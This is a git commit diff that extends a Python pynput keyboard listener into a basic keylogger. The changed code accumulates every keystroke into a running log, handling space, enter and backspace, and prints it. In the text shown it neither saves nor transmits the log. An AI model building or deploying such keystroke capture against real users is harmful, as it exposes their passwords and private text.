1758f18d05f33b8f47ad1fd81f768942b8263af4
hostuser <kali@host.dev>
2022-11-10 20:10:03 +1000

    Managing exception and catching special keys.

--- mkey/mwKeyl.py
+++ mkey/mwKeyl.py
@@ -2,8 +2,27 @@
 
 from pynput import keyboard
 
+log = ""
+
 def on_key_press(key):
-    print(key)
+    global log
+    try:
+        log = log + str(key.char)
+        print(log)
+    except AttributeError:
+        if key == keyboard.Key.space:
+            log = log + " "
+            print(log)
+        elif key == keyboard.Key.enter:
+            log = log + "\n"
+            print(log)
+        elif key == keyboard.Key.backspace:
+            log = log[:-1]
+            print(log)
+        elif key == keyboard.Key.esc:
+            return False
+        else:
+            print(key)
 
 with keyboard.Listener(on_press=on_key_press) as listener:
     listener.join()
